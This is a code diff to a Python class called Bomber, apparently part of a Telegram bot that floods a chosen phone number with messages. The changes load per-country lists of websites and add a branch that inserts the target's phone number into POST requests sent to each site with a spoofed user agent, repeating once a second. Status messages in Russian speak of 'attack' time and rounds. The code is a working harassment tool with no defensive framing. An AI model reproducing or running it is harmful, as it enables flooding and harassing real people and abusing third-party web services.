@@ -55,8 +55,8 @@ class Bomber:
         if my_circles == "∞":self.state_seconds = "∞"
         else:self.state_seconds = int(my_circles)
 
-        with open("sites.json", "r", encoding="UTF-8") as all_sites:
-                sites = json.loads(all_sites.read())
+        with open(r"sites/sites_%s.json" % globals.attack_country, "r", encoding="UTF-8") as all_sites:
+            sites = json.loads(all_sites.read())
         
         while self.process_status:
             if self.state_seconds == "∞":pass
@@ -68,8 +68,8 @@ class Bomber:
                         status=self.state_seconds
                     ).where(data_users_table.c.user_id==chat_id)
                     globals.conn.execute(update_data)
-                    await globals.bot.send_message(chat_id, 
-                    text=f"⌛️Круги исчерпаны...")
+                    await message.answer(
+                            text=f"⌛️Круги исчерпаны...")
                     return await self.session.close()
                     break
 
@@ -81,9 +81,9 @@ class Bomber:
                 globals.conn.execute(update_data)
 
                 globals.sql.commit()
-                await globals.bot.send_message(chat_id, 
-                text=f"⌛️Превышено время атаки... Не забывайте отключать атаку!\n"
-                f"⚙️Влияет на нагрузку памяти и процессора!")
+                await message.answer(
+                        text=f"⌛️Превышено время атаки... Не забывайте отключать атаку!\n"
+                        f"⚙️Влияет на нагрузку памяти и процессора!")
                 await self.session.close()
                 break
 
@@ -105,6 +105,17 @@ class Bomber:
                     async with self.session.post(
                         url=v["url"], 
                         data=dct,  
+                        headers=self.user_agent
+                    ) as resp:pass
+                    await asyncio.sleep(1)
+                
+                elif "params" in list(v.keys()) and not v["format"]:
+                    dct = v["json"]
+                    dct[v["arg"]] = v["plus"]+phone
+
+                    async with self.session.post(
+                        url=v["url"], 
+                        params=dct,  
                         headers=self.user_agent
                     ) as resp:pass
                     await asyncio.sleep(1)
